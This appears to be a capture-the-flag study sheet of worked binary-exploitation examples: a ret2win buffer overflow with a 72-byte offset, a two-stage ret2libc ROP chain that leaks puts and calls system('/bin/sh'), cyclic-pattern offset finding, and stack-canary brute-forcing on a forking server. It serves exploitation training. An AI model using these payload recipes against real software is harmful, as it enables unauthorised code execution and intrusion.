# Worked examples — the numbers

## ret2win, fully worked

1. `pwn_triage ./chal` → NX on, no canary, no PIE, `win()` at 0x4011a3.
2. `pwn_cyclic 100` → send → crash, RIP = 0x6161616b.
3. `pwn_cyclic --find 0x6161616b` → offset 72.
4. Payload: `b'A'*72 + p64(0x4011a3)` → send → flag printed.

## ret2system, one leak

1. `pwn_triage` → NX on, PIE, partial RELRO, canary absent.
2. Leak: `puts@plt(puts@got)` → libc base from the printed address minus
   puts's offset in the challenge's libc.
3. chain1: `pad + pop rdi;ret + puts_got + puts_plt + main_plt` — leaks
   puts's libc addr, returns to main for stage 2.
4. chain2: `pad + pop rdi;ret + binsh_in_libc + system_addr + exit_addr`.

## Offset measurement

Pattern 'aaaabaaacaaadaaa...' at length 300; crash shows RIP = 'kaaa'
(0x6161616b). `pwn_cyclic --find 0x6161616b` → 72. Padding = 72 bytes to
saved RIP; subtract 8 for saved-RBP region if needed.

## Canary fork-brute

Forking server: for byte i in 0..7, send `pad + correct_prefix +
candidate_byte`; a connection that returns normally = right byte. 8 bytes,
~256 worst-case tries each → canary recovered.
